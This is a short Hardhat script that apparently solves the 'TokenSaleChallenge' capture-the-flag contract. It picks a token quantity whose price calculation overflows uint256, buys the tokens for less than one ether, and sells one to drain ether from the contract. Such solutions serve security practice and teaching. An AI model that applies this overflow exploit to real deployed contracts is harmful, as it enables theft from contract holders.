import { ethers } from 'hardhat';
const { utils, provider, BigNumber, constants } = ethers;

const address = '0xB960c4FeF4E1819A0ea28E7E9ff2b8091604bA68';

async function main() {
  const targetFactory = await ethers.getContractFactory('TokenSaleChallenge');
  const target = await targetFactory.attach(address);
  await target.deployed();

  console.log('Target deployed to:', target.address);

  const MAX_UINT256_VALUE = constants.MaxUint256; // (2**256 - 1)
  const TOKEN_PRICE = utils.parseEther('1'); // (10**18)

  const ETH_TO_STEAL = MAX_UINT256_VALUE.mod(TOKEN_PRICE);
  const TOKENS_TO_BUY = MAX_UINT256_VALUE.sub(ETH_TO_STEAL).div(TOKEN_PRICE).add(1);
  const ETHER_TO_SEND = TOKEN_PRICE.sub(ETH_TO_STEAL).sub(1);

  console.log('TOKENS_TO_BUY:', TOKENS_TO_BUY.toString());
  console.log('ETHER_TO_SEND:', ETHER_TO_SEND.toString());

  let tx;
  console.log('buying tokens');
  tx = await target.buy(TOKENS_TO_BUY, {
    value: ETHER_TO_SEND,
  });
  await tx.wait();

  console.log('selling tokens');
  tx = await target.sell(1);
  await tx.wait();
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
